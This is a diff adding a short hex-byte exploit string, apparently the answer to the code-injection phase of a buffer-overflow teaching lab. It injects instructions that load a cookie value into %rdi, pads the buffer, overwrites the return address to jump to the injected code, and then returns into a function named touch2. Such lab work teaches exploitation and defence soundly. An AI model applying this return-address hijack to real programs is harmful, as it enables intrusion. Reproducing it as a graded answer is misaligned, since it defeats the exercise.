@@ -1,0 +1,5 @@
+48 c7 c7 fa 97 b9 59 /* mov    $0x59b997fa,%rdi */
+c3                   /* retq */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 /* 32 paddings */
+78 dc 61 55 00 00 00 00 /* return address of the injected code above, equals to %rsp here */
+ec 17 40 00 00 00 00 00 /* return address of touch2 */
